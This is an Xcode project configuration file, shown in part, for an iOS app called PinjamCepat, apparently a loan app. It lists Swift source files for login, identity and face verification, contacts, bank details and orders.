// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		067C772D9AC0E21A1CA27DA2 /* Pods_PinjamCepat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 081711C23D814A2FC81ADDF4 /* Pods_PinjamCepat.framework */; };
		7315F83E2F7220FC00C6DE2E /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7315F8342F7220FC00C6DE2E /* AppDelegate.swift */; };
		7315F8412F7220FC00C6DE2E /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 7315F8352F7220FC00C6DE2E /* Assets.xcassets */; };
		7315F8432F7220FC00C6DE2E /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 7315F8382F7220FC00C6DE2E /* LaunchScreen.storyboard */; };
		73434AA22F7423BB00D99435 /* FaceViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73434AA12F7423BB00D99435 /* FaceViewController.swift */; };
		73434AA42F7427A600D99435 /* PhotoIdViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73434AA32F7427A600D99435 /* PhotoIdViewController.swift */; };
		734CD1AF2F766A2F00CA4730 /* CustomLocationManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 734CD1AE2F766A2F00CA4730 /* CustomLocationManager.swift */; };
		7352E1042F752D5B0006B053 /* ContactViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7352E1032F752D5A0006B053 /* ContactViewController.swift */; };
		7352E1082F752D690006B053 /* BankSerVice.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7352E1052F752D690006B053 /* BankSerVice.swift */; };
		7352E1092F752D690006B053 /* BankViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7352E1062F752D690006B053 /* BankViewModel.swift */; };
		7352E10A2F752D690006B053 /* BankViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7352E1072F752D690006B053 /* BankViewController.swift */; };
		7362DFE42F73741300D50737 /* AppRouter.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE32F73741300D50737 /* AppRouter.swift */; };
		7362DFE62F73747900D50737 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE52F73747900D50737 /* ProductViewController.swift */; };
		7362DFE82F73751000D50737 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE72F73751000D50737 /* SettingsViewController.swift */; };
		7362DFEA2F737AD100D50737 /* PopTryAgainView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE92F737AD100D50737 /* PopTryAgainView.swift */; };
		7362DFEC2F7381D600D50737 /* EnView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFEB2F7381D600D50737 /* EnView.swift */; };
		7362DFEE2F7381E400D50737 /* EndView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFED2F7381E400D50737 /* EndView.swift */; };
		7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF22F73820400D50737 /* HomeViewModel.swift */; };
		7362DFF52F73821300D50737 /* HomeService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF42F73820F00D50737 /* HomeService.swift */; };
		7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF62F73876F00D50737 /* EndCardView.swift */; };
		736CA1AA2F72D43600FDB0EB /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */; };
		736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AB2F72D43900FDB0EB /* LoginService.swift */; };
		736CA1AE2F72D9FE00FDB0EB /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */; };
		736CA1B02F72DBB000FDB0EB /* CenterViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */; };
		736CA1B22F72DBB300FDB0EB /* CenterService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1B12F72DBB200FDB0EB /* CenterService.swift */; };
		736CA1B42F72E34700FDB0EB /* CenterListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1B32F72E34700FDB0EB /* CenterListView.swift */; };
		736CA1B92F72E63400FDB0EB /* AppHeadView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1B82F72E63400FDB0EB /* AppHeadView.swift */; };
		736CA1BB2F72E70200FDB0EB /* H5WebViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1BA2F72E70200FDB0EB /* H5WebViewController.swift */; };
		739AE6FA2F7610730076543E /* ContactSerVice.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE6F82F7610730076543E /* ContactSerVice.swift */; };
		739AE6FB2F7610730076543E /* ContactViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE6F92F7610730076543E /* ContactViewModel.swift */; };
		739AE6FD2F7614160076543E /* ContactViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE6FC2F7614160076543E /* ContactViewCell.swift */; };
		739AE6FF2F761F230076543E /* ContactManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE6FE2F761F230076543E /* ContactManager.swift */; };
		739AE7012F7635850076543E /* OrderListEmptyView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE7002F7635850076543E /* OrderListEmptyView.swift */; };
		739AE7032F7636860076543E /* OrderViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE7022F7636800076543E /* OrderViewModel.swift */; };
		739AE7052F7636900076543E /* OrderViewService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE7042F76368B0076543E /* OrderViewService.swift */; };
		739AE7072F7637DB0076543E /* OrderListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE7062F7637DB0076543E /* OrderListViewCell.swift */; };
		739AE7092F764CA30076543E /* OrderListView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE7082F764CA30076543E /* OrderListView.swift */; };
		739AE70B2F7650CB0076543E /* HomeErrorView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE70A2F7650CB0076543E /* HomeErrorView.swift */; };
		739AE70D2F7653C90076543E /* HomeCardViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE70C2F7653C90076543E /* HomeCardViewCell.swift */; };
		739AE70F2F7653E80076543E /* HomeProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 739AE70E2F7653E80076543E /* HomeProductListViewCell.swift */; };
		73C5A1F52F7436F1007A963B /* CompleteViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73C5A1F42F7436F1007A963B /* CompleteViewController.swift */; };
		73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69802F7229A90096AE72 /* BaseViewController.swift */; };
		73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69822F7229C00096AE72 /* BaseTabBarController.swift */; };
		73ED69852F7229CF0096AE72 /* BaseNavigationController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69842F7229CF0096AE72 /* BaseNavigationController.swift */; };
		73ED69892F722A570096AE72 /* Localizable.strings in Resources */ = {isa = PBXBuildFile; fileRef = 73ED69872F722A570096AE72 /* Localizable.strings */; };
		73ED69942F72530F0096AE72 /* HomeViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69932F72530F0096AE72 /* HomeViewController.swift */; };
		73ED69962F7253170096AE72 /* OrderViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69952F7253170096AE72 /* OrderViewController.swift */; };
		73ED69982F7253200096AE72 /* CenterViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69972F7253200096AE72 /* CenterViewController.swift */; };
		73ED699A2F7253440096AE72 /* BaseView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69992F7253440096AE72 /* BaseView.swift */; };
		73ED699C2F72543C0096AE72 /* AppLaunchViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED699B2F72543C0096AE72 /* AppLaunchViewController.swift */; };
		73ED699E2F7257DB0096AE72 /* NetworkMonitor.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED699D2F7257DB0096AE72 /* NetworkMonitor.swift */; };
		73ED69A02F7258850096AE72 /* AppNetworkConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED699F2F7258850096AE72 /* AppNetworkConfig.swift */; };
		73ED69A22F725A180096AE72 /* NetworkEnvManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69A12F725A180096AE72 /* NetworkEnvManager.swift */; };
		73ED69A42F725B240096AE72 /* BaseModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69A32F725B210096AE72 /* BaseModel.swift */; };
		73ED69A62F725B310096AE72 /* NetworkManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69A52F725B310096AE72 /* NetworkManager.swift */; };
		73ED69AB2F72628C0096AE72 /* LaunchViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69AA2F7262860096AE72 /* LaunchViewModel.swift */; };
		73ED69AD2F7262940096AE72 /* LaunchService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69AC2F7262900096AE72 /* LaunchService.swift */; };
		73ED69AF2F7263490096AE72 /* LoadingManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69AE2F7263490096AE72 /* LoadingManager.swift */; };
		73ED69B12F7263E30096AE72 /* ToastManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B02F7263E30096AE72 /* ToastManager.swift */; };
		73ED69B32F7268C30096AE72 /* DeviceIdentifier.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B22F7268C30096AE72 /* DeviceIdentifier.swift */; };
		73ED69B52F7269B70096AE72 /* DeviceParamsManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B42F7269B70096AE72 /* DeviceParamsManager.swift */; };
		73ED69B72F72781B0096AE72 /* LanguageManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B62F72781B0096AE72 /* LanguageManager.swift */; };
		73ED69B92F727BB90096AE72 /* LoginViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69B82F727BB90096AE72 /* LoginViewController.swift */; };
		73ED69BB2F727BF00096AE72 /* LoginView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69BA2F727BF00096AE72 /* LoginView.swift */; };
		73ED69BD2F727CD30096AE72 /* LoginManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73ED69BC2F727CD30096AE72 /* LoginManager.swift */; };
		73F39FD52F73AF52004B0C78 /* ProductView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD42F73AF52004B0C78 /* ProductView.swift */; };
		73F39FD72F73AF5F004B0C78 /* ProductViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */; };
		73F39FD92F73AF6A004B0C78 /* ProductService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FD82F73AF63004B0C78 /* ProductService.swift */; };
		73F39FDB2F73B6D6004B0C78 /* ProductListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */; };
		73F6A3C92F74D8D900A7ABD2 /* TimeSelectView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */; };
		73F6A3CB2F74F58800A7ABD2 /* PopIDAuthView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3CA2F74F57800A7ABD2 /* PopIDAuthView.swift */; };
		73F6A3CD2F74F7FF00A7ABD2 /* SureListViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3CC2F74F7FF00A7ABD2 /* SureListViewCell.swift */; };
		73F6A3CF2F75086400A7ABD2 /* PersonalViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3CE2F75086400A7ABD2 /* PersonalViewController.swift */; };
		73F6A3D12F750EB300A7ABD2 /* PersonalViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D02F750EAB00A7ABD2 /* PersonalViewModel.swift */; };
		73F6A3D32F750EBE00A7ABD2 /* PersonalSerVice.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D22F750EB700A7ABD2 /* PersonalSerVice.swift */; };
		73F6A3D52F751BC700A7ABD2 /* AppSheetSelectView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D42F751BC700A7ABD2 /* AppSheetSelectView.swift */; };
		73F6A3DA2F7524AA00A7ABD2 /* WorkViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D72F7524AA00A7ABD2 /* WorkViewModel.swift */; };
		73F6A3DB2F7524AA00A7ABD2 /* WorkSerVice.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D62F7524AA00A7ABD2 /* WorkSerVice.swift */; };
		73F6A3DC2F7524AA00A7ABD2 /* WorkViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73F6A3D82F7524AA00A7ABD2 /* WorkViewController.swift */; };
		73FB533A2F74C127000169D3 /* FaceViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB53392F74C11F000169D3 /* FaceViewModel.swift */; };
		73FB533C2F74C135000169D3 /* FaceService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB533B2F74C12F000169D3 /* FaceService.swift */; };
		73FB533E2F74C48C000169D3 /* CameraManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 73FB533D2F74C48C000169D3 /* CameraManager.swift */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		081711C23D814A2FC81ADDF4 /* Pods_PinjamCepat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_PinjamCepat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		7315F81C2F7220F400C6DE2E /* PinjamCepat.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PinjamCepat.app; sourceTree = BUILT_PRODUCTS_DIR; };
		7315F8342F7220FC00C6DE2E /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
		7315F8352F7220FC00C6DE2E /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		7315F8362F7220FC00C6DE2E /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		7315F8372F7220FC00C6DE2E /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		7315F8452F7221CD00C6DE2E /* PinjamCepat.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = PinjamCepat.entitlements; sourceTree = "<group>"; };
		73434AA12F7423BB00D99435 /* FaceViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewController.swift; sourceTree = "<group>"; };
		73434AA32F7427A600D99435 /* PhotoIdViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PhotoIdViewController.swift; sourceTree = "<group>"; };
		734CD1AE2F766A2F00CA4730 /* CustomLocationManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomLocationManager.swift; sourceTree = "<group>"; };
		7352E1032F752D5A0006B053 /* ContactViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewController.swift; sourceTree = "<group>"; };
		7352E1052F752D690006B053 /* BankSerVice.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankSerVice.swift; sourceTree = "<group>"; };
		7352E1062F752D690006B053 /* BankViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankViewModel.swift; sourceTree = "<group>"; };
		7352E1072F752D690006B053 /* BankViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BankViewController.swift; sourceTree = "<group>"; };
		7362DFE32F73741300D50737 /* AppRouter.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppRouter.swift; sourceTree = "<group>"; };
		7362DFE52F73747900D50737 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
		7362DFE72F73751000D50737 /* SettingsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
		7362DFE92F737AD100D50737 /* PopTryAgainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTryAgainView.swift; sourceTree = "<group>"; };
		7362DFEB2F7381D600D50737 /* EnView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnView.swift; sourceTree = "<group>"; };
		7362DFED2F7381E400D50737 /* EndView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EndView.swift; sourceTree = "<group>"; };
		7362DFF22F73820400D50737 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
		7362DFF42F73820F00D50737 /* HomeService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeService.swift; sourceTree = "<group>"; };
		7362DFF62F73876F00D50737 /* EndCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EndCardView.swift; sourceTree = "<group>"; };
		736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
		736CA1AB2F72D43900FDB0EB /* LoginService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginService.swift; sourceTree = "<group>"; };
		736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
		736CA1AF2F72DBB000FDB0EB /* CenterViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewModel.swift; sourceTree = "<group>"; };
		736CA1B12F72DBB200FDB0EB /* CenterService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterService.swift; sourceTree = "<group>"; };
		736CA1B32F72E34700FDB0EB /* CenterListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterListView.swift; sourceTree = "<group>"; };
		736CA1B82F72E63400FDB0EB /* AppHeadView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppHeadView.swift; sourceTree = "<group>"; };
		736CA1BA2F72E70200FDB0EB /* H5WebViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = H5WebViewController.swift; sourceTree = "<group>"; };
		739AE6F82F7610730076543E /* ContactSerVice.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactSerVice.swift; sourceTree = "<group>"; };
		739AE6F92F7610730076543E /* ContactViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewModel.swift; sourceTree = "<group>"; };
		739AE6FC2F7614160076543E /* ContactViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactViewCell.swift; sourceTree = "<group>"; };
		739AE6FE2F761F230076543E /* ContactManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ContactManager.swift; sourceTree = "<group>"; };
		739AE7002F7635850076543E /* OrderListEmptyView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListEmptyView.swift; sourceTree = "<group>"; };
		739AE7022F7636800076543E /* OrderViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewModel.swift; sourceTree = "<group>"; };
		739AE7042F76368B0076543E /* OrderViewService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewService.swift; sourceTree = "<group>"; };
		739AE7062F7637DB0076543E /* OrderListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListViewCell.swift; sourceTree = "<group>"; };
		739AE7082F764CA30076543E /* OrderListView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderListView.swift; sourceTree = "<group>"; };
		739AE70A2F7650CB0076543E /* HomeErrorView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeErrorView.swift; sourceTree = "<group>"; };
		739AE70C2F7653C90076543E /* HomeCardViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeCardViewCell.swift; sourceTree = "<group>"; };
		739AE70E2F7653E80076543E /* HomeProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeProductListViewCell.swift; sourceTree = "<group>"; };
		73C5A1F42F7436F1007A963B /* CompleteViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CompleteViewController.swift; sourceTree = "<group>"; };
		73ED69802F7229A90096AE72 /* BaseViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseViewController.swift; sourceTree = "<group>"; };
		73ED69822F7229C00096AE72 /* BaseTabBarController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseTabBarController.swift; sourceTree = "<group>"; };
		73ED69842F7229CF0096AE72 /* BaseNavigationController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseNavigationController.swift; sourceTree = "<group>"; };
		73ED69882F722A570096AE72 /* en */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = en; path = en.lproj/Localizable.strings; sourceTree = "<group>"; };
		73ED698A2F722A690096AE72 /* id */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = id; path = id.lproj/Localizable.strings; sourceTree = "<group>"; };
		73ED69932F72530F0096AE72 /* HomeViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewController.swift; sourceTree = "<group>"; };
		73ED69952F7253170096AE72 /* OrderViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = OrderViewController.swift; sourceTree = "<group>"; };
		73ED69972F7253200096AE72 /* CenterViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterViewController.swift; sourceTree = "<group>"; };
		73ED69992F7253440096AE72 /* BaseView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseView.swift; sourceTree = "<group>"; };
		73ED699B2F72543C0096AE72 /* AppLaunchViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppLaunchViewController.swift; sourceTree = "<group>"; };
		73ED699D2F7257DB0096AE72 /* NetworkMonitor.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkMonitor.swift; sourceTree = "<group>"; };
		73ED699F2F7258850096AE72 /* AppNetworkConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppNetworkConfig.swift; sourceTree = "<group>"; };
		73ED69A12F725A180096AE72 /* NetworkEnvManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkEnvManager.swift; sourceTree = "<group>"; };
		73ED69A32F725B210096AE72 /* BaseModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BaseModel.swift; sourceTree = "<group>"; };
		73ED69A52F725B310096AE72 /* NetworkManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NetworkManager.swift; sourceTree = "<group>"; };
		73ED69AA2F7262860096AE72 /* LaunchViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchViewModel.swift; sourceTree = "<group>"; };
		73ED69AC2F7262900096AE72 /* LaunchService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LaunchService.swift; sourceTree = "<group>"; };
		73ED69AE2F7263490096AE72 /* LoadingManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoadingManager.swift; sourceTree = "<group>"; };
		73ED69B02F7263E30096AE72 /* ToastManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ToastManager.swift; sourceTree = "<group>"; };
		73ED69B22F7268C30096AE72 /* DeviceIdentifier.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceIdentifier.swift; sourceTree = "<group>"; };
		73ED69B42F7269B70096AE72 /* DeviceParamsManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DeviceParamsManager.swift; sourceTree = "<group>"; };
		73ED69B62F72781B0096AE72 /* LanguageManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LanguageManager.swift; sourceTree = "<group>"; };
		73ED69B82F727BB90096AE72 /* LoginViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewController.swift; sourceTree = "<group>"; };
		73ED69BA2F727BF00096AE72 /* LoginView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginView.swift; sourceTree = "<group>"; };
		73ED69BC2F727CD30096AE72 /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
		73F39FD42F73AF52004B0C78 /* ProductView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductView.swift; sourceTree = "<group>"; };
		73F39FD62F73AF56004B0C78 /* ProductViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewModel.swift; sourceTree = "<group>"; };
		73F39FD82F73AF63004B0C78 /* ProductService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductService.swift; sourceTree = "<group>"; };
		73F39FDA2F73B6D6004B0C78 /* ProductListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductListViewCell.swift; sourceTree = "<group>"; };
		73F6A3C82F74D8D900A7ABD2 /* TimeSelectView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeSelectView.swift; sourceTree = "<group>"; };
		73F6A3CA2F74F57800A7ABD2 /* PopIDAuthView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopIDAuthView.swift; sourceTree = "<group>"; };
		73F6A3CC2F74F7FF00A7ABD2 /* SureListViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SureListViewCell.swift; sourceTree = "<group>"; };
		73F6A3CE2F75086400A7ABD2 /* PersonalViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewController.swift; sourceTree = "<group>"; };
		73F6A3D02F750EAB00A7ABD2 /* PersonalViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalViewModel.swift; sourceTree = "<group>"; };
		73F6A3D22F750EB700A7ABD2 /* PersonalSerVice.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PersonalSerVice.swift; sourceTree = "<group>"; };
		73F6A3D42F751BC700A7ABD2 /* AppSheetSelectView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppSheetSelectView.swift; sourceTree = "<group>"; };
		73F6A3D62F7524AA00A7ABD2 /* WorkSerVice.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkSerVice.swift; sourceTree = "<group>"; };
		73F6A3D72F7524AA00A7ABD2 /* WorkViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewModel.swift; sourceTree = "<group>"; };
		73F6A3D82F7524AA00A7ABD2 /* WorkViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = WorkViewController.swift; sourceTree = "<group>"; };
		73FB53392F74C11F000169D3 /* FaceViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceViewModel.swift; sourceTree = "<group>"; };
		73FB533B2F74C12F000169D3 /* FaceService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FaceService.swift; sourceTree = "<group>"; };
		73FB533D2F74C48C000169D3 /* CameraManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CameraManager.swift; sourceTree = "<group>"; };
		8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.release.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.release.xcconfig"; sourceTree = "<group>"; };
